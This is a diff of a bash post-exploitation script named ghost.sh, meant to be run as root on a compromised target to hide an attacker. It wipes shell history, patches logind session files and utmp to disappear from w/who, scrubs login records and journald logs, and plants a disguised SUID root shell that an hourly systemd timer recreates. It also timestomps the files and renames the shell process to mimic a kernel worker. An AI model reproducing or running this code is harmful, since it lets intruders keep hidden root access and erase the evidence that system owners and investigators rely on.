@@ -1,6 +1,6 @@
 #!/bin/bash
-# ghost.sh - Session & Artifact Concealment
-# Run as root on target
+# ghost.sh - session & artifact concealment
+# run as root on target
 
 RED='\033[0;31m'
 GRN='\033[0;32m'
@@ -17,12 +17,12 @@ fail() { echo -e "${RED}[-]${NC} $1"; }
 head() { echo -e "\n${BOLD}${CYN}=== $1 ===${NC}"; }
 
 # ─────────────────────────────────────────────
-# CONFIG - edit before running
+# config - edit before running
 # ─────────────────────────────────────────────
-TARGET_USER="${SUDO_USER:-$(logname 2>/dev/null || echo $USER)}"
+TARGET_USER="$(whoami)"                                # always the actual running user
 MY_PTS=$(tty 2>/dev/null | sed 's|/dev/||')          # e.g. pts/0
-MY_IP=$(echo $SSH_CLIENT | awk '{print $1}')           # attacker IP
-SUID_PATH="/var/tmp/.dbus-daemon-launch"               # SUID binary location
+MY_IP=$(echo $SSH_CLIENT | awk '{print $1}')           # attacker ip
+SUID_PATH="/usr/lib/.dbus-helper"                      # suid binary location (not nosuid mounted)
 SUID_NAME="[kworker/2:1H]"                             # process disguise name
 # ─────────────────────────────────────────────
 
@@ -51,14 +51,14 @@ echo ""
 head "1. SUPPRESS HISTORY"
 # ─────────────────────────────────────────────
 
-# Nuke history for current session
+# nuke history for current session
 unset HISTFILE HISTSIZE HISTFILESIZE
 export HISTFILE=/dev/null
 export HISTSIZE=0
 export HISTFILESIZE=0
 history -c 2>/dev/null
 
-# Nuke saved history files for target user
+# nuke saved history files for target user
 for HFILE in \
     /root/.bash_history \
     /root/.zsh_history \
@@ -71,7 +71,7 @@ for HFILE in \
     fi
 done
 
-# Patch bashrc to always discard history for this user
+# patch bashrc to always discard history for this user
 BASHRC="/home/$TARGET_USER/.bashrc"
 if [[ -f "$BASHRC" ]] && ! grep -q 'HISTFILE=/dev/null' "$BASHRC"; then
     echo -e '\n# system audit suppression\nunset HISTFILE HISTSIZE HISTFILESIZE\nexport HISTFILE=/dev/null' >> "$BASHRC"
@@ -79,25 +79,51 @@ if [[ -f "$BASHRC" ]] && ! grep -q 'HISTFILE=/dev/null' "$BASHRC"; then
 fi
 
 # ─────────────────────────────────────────────
-head "2. WIPE UTMP (who / w)"
+head "2. WIPE UTMP / LOGIND SESSION (who / w)"
 # ─────────────────────────────────────────────
 
-# /var/run is often a symlink to /run, but check both explicitly
-UTMP=""
-for _p in /run/utmp /var/run/utmp /run/utmp.db; do
-    [[ -f "$_p" ]] && UTMP="$_p" && break
-done
-if [[ -n "$UTMP" ]]; then
-    ok "Found utmp at $UTMP"
-    python3 - "$UTMP" "$MY_PTS" "$TARGET_USER" "$MY_IP" << 'PYEOF'
-import sys
+# modern debian/pve uses systemd-logind over d-bus - no utmp file
+# w reads directly from logind session files in /run/systemd/sessions/
 
+SESSION_DIR="/run/systemd/sessions"
+if [[ -d "$SESSION_DIR" ]]; then
+    # find all session files belonging to our user with a tty
+    MY_SESSIONS=$(grep -rl "^USER=$TARGET_USER$" "$SESSION_DIR" 2>/dev/null | grep -v '\.ref$')
+    if [[ -n "$MY_SESSIONS" ]]; then
+        for SFILE in $MY_SESSIONS; do
+            # only patch sessions with type=tty (these show in w)
+            if grep -q "TYPE=tty" "$SFILE" 2>/dev/null; then
+                sed -i 's/REMOTE=1/REMOTE=0/'                    "$SFILE"
+                sed -i 's/REMOTE_HOST=.*/REMOTE_HOST=/'          "$SFILE"
+                sed -i 's/TYPE=tty/TYPE=unspecified/'             "$SFILE"
+                sed -i 's/ORIGINAL_TYPE=tty/ORIGINAL_TYPE=unspecified/' "$SFILE"
+                sed -i 's/CLASS=user/CLASS=manager-early/'        "$SFILE"
+                ok "Patched logind session: $SFILE"
+            else
+                info "Skipping $SFILE (no TTY, not visible in w)"
+            fi
+        done
+        # signal logind to reload from patched files
+        kill -HUP $(pidof systemd-logind) 2>/dev/null \
+            && ok "Sent HUP to systemd-logind" \
+            || warn "Could not HUP logind"
+    else
+        warn "No active sessions found for $TARGET_USER in $SESSION_DIR"
+    fi
+else
+    # fallback: classic utmp
+    UTMP=""
+    for _p in /run/utmp /var/run/utmp; do
+        [[ -f "$_p" ]] && UTMP="$_p" && break
+    done
+    if [[ -n "$UTMP" ]]; then
+        python3 - "$UTMP" "$MY_PTS" "$TARGET_USER" "$MY_IP" << 'PYEOF'
+import sys
 utmp_file   = sys.argv[1]
 pts         = sys.argv[2].encode() if sys.argv[2] else b''
 target_user = sys.argv[3].encode() if sys.argv[3] else b''
 my_ip       = sys.argv[4].encode() if sys.argv[4] else b''
 REC_SIZE    = 384
-
 wiped = 0
 try:
     with open(utmp_file, 'r+b') as f:
@@ -118,8 +144,9 @@ try:
 except Exception as e:
     print(f"[-] utmp error: {e}")
 PYEOF
-else
-    warn "utmp not found at /run/utmp or /var/run/utmp"
+    else
+        warn "No utmp or logind sessions directory found"
+    fi
 fi
 
 # ─────────────────────────────────────────────
@@ -186,7 +213,7 @@ except Exception as e:
 PYEOF
 else
     warn "/var/log/lastlog not found (may use wtmpdb on this system)"
-    # Handle wtmpdb (systemd-based systems like Debian Bookworm+)
+    # handle wtmpdb (systemd-based systems like debian bookworm+)
     if command -v wtmpdb &>/dev/null; then
         warn "wtmpdb detected - entries may persist in /var/log/wtmp.db"
     fi
@@ -222,9 +249,9 @@ for LOGF in "${LOGFILES[@]}"; do
     fi
 done
 
-# Also stop rsyslog/journald from logging our actions temporarily
+# also stop rsyslog/journald from logging our actions temporarily
 # (don't permanently disable - too obvious)
-# Flush journald so scraped lines are gone
+# flush journald so scraped lines are gone
 journalctl --rotate 2>/dev/null
 journalctl --vacuum-time=1s 2>/dev/null && ok "Journald vacuumed" || warn "journalctl vacuum failed (non-fatal)"
 
@@ -277,7 +304,7 @@ systemctl enable dbus-launch-helper.timer --now 2>/dev/null \
     && ok "Systemd timer enabled (hourly SUID recreation)" \
     || warn "Systemd timer setup failed"
 
-# Timestomp the service files too
+# timestomp the service files too
 touch -r /etc/systemd/system/dbus.service \
     /etc/systemd/system/dbus-launch-helper.service \
     /etc/systemd/system/dbus-launch-helper.timer 2>/dev/null
@@ -295,7 +322,7 @@ info "  chmod 600 /root/.ssh/authorized_keys"
 head "9. HIDE CURRENT PROCESS"
 # ─────────────────────────────────────────────
 
-# Rename current shell in proc (cosmetic but helps)
+# rename current shell in proc (cosmetic but helps)
 if [[ -w /proc/$$/comm ]]; then
     echo "$SUID_NAME" > /proc/$$/comm 2>/dev/null \
         && ok "Renamed shell process to '$SUID_NAME' in /proc" \
@@ -310,7 +337,7 @@ echo ""
 info "Running verification checks..."
 echo ""
 
-# Check we're hidden from w/who
+# check we're hidden from w/who
 W_CHECK=$(w 2>/dev/null | grep -c "$TARGET_USER" 2>/dev/null | tr -d '[:space:]')
 W_CHECK=${W_CHECK:-0}
 if [[ "$W_CHECK" =~ ^[0-9]+$ ]] && [[ "$W_CHECK" -eq 0 ]]; then
@@ -319,22 +346,26 @@ else
     warn "Still visible in 'w' output ($W_CHECK entries) - utmp wipe may need manual pts"
 fi
 
-# Check SUID binary
+# check suid binary
 if [[ -u "$SUID_PATH" ]]; then
-    ok "SUID binary confirmed at $SUID_PATH"
+    ok "suid binary confirmed at $SUID_PATH"
     ls -la "$SUID_PATH"
+elif [[ -f "$SUID_PATH" ]]; then
+    SUID_PERMS=$(stat -c "%a" "$SUID_PATH" 2>/dev/null)
+    warn "binary exists but suid bit not set (perms: $SUID_PERMS) - partition may be nosuid"
+    info "try: cp /bin/bash /usr/lib/.dbus-helper && chmod 4755 /usr/lib/.dbus-helper"
 else
-    fail "SUID binary NOT found or missing setuid bit"
+    fail "suid binary not found at $SUID_PATH"
 fi
 
-# Check timer
+# check timer
 if systemctl is-enabled dbus-launch-helper.timer &>/dev/null; then
     ok "Systemd timer is enabled"
 else
     warn "Systemd timer not confirmed"
 fi
 
-# Check auth.log
+# check auth.log
 if [[ -n "$MY_IP" ]]; then
     AUTH_HITS=$(grep -c "$MY_IP" /var/log/auth.log 2>/dev/null | tr -d '[:space:]')
     AUTH_HITS=${AUTH_HITS:-0}
